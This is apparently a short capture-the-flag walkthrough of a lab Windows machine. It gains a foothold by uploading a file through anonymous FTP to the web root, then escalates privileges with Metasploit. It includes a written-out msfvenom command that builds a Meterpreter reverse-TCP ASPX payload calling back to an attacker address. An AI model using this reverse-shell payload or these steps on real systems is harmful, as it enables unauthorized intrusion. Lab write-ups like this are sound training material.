## Foothold

1. Run initial port scan, we get two ports openn : 21 and 80.
2. We can see from nmap banner that there is anonymous login allowed in ftp.
3. Visiting the website and running gobuster we don't find any directories within the website, but we can see that the files present in the FTP can be accessed by us. Thus we can upload a reverse shell.
4. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.20 LPORT=9000 -f aspx > revshell.aspx
5. Upload this file to ftp and running a meterpreter listening session.
6. Execute the payload, we get a shell.

## Priv Esc

7. We can see under c:\Users\babis\Desktop there is a user.txt.txt, but access denied.
8. One of the advantages of using metasploit is the post exploit analysis. We can use local_exploit_suggester module through the session created.
9. We get 9 exploit matches, we can test them one by one and see that one would match.
10. Cat out the user.txt.txt and the root.txt
 
